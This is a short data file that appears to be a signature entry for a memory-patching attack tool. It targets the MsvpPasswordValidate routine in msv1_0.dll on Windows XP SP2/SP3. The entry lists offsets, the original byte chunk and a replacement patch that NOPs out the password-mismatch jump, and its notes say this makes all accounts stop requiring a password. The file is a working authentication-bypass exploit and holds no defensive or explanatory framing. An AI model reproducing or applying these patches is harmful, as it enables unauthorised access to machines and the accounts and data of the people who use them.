page = 0
offset = 0x9b6
signature = \
[{'OS': 'Windows XP',
  'versions': ['SP2', 'SP3'],
  'architectures': ['x86'],
  'name': 'msv1_0.dll MsvpPasswordValidate technique',
  'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password. The XP2 technique patches the call which decides if an account requires password authentication. ',
  'signatures': [{'offsets': [0x862, 0x8aa, 0x946, 0x126, 0x9b6],
                  'chunks': [{'chunk': 0x83f8107511b0018b,
                              'internaloffset': 0x00,
                              'patch': 0x83f8109090b0018b,
                              'patchoffset': 0x00}]}]}]
